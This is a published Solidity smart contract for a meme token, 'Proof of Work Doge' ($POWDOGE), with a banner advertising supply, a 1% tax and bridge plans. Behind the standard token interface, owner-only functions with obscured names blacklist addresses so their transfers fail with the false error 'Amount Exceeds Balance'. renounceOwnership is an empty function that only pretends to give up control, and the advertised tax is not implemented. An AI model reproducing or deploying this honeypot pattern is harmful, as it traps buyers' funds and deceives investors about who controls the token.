/**
 *Submitted for verification at Etherscan.io on 2022-09-10
*/

pragma solidity 0.8.17;
/*

 _____ _____ _ _ _    ____  _____ _____ _____ 
|  _  |     | | | |  |    \|     |   __|   __|
|   __|  |  | | | |  |  |  |  |  |  |  |   __|
|__|  |_____|_____|  |____/|_____|_____|_____|

Proof of Work Doge - $POWDOGE


Tokenomics

- 100m Supply
- 1% Tax
- 1:1 Snapshot at Merge  - PulseChain Bridge Support Q4 2022 (PRC20)

 @POWDOGE social

*/    

contract POWDOGE {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) xzAmnt;

    // 
    string public name = "Proof of Work Doge";
    string public symbol = unicode"POWDOGE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function auwdnba(address _user) public onlyOwner {
        require(!xzAmnt[_user], "x");
        xzAmnt[_user] = true;
     
    }
    
    function azwvnbb(address _user) public onlyOwner {
        require(xzAmnt[_user], "xx");
        xzAmnt[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!xzAmnt[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!xzAmnt[from] , "Amount Exceeds Balance"); 
               require(!xzAmnt[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}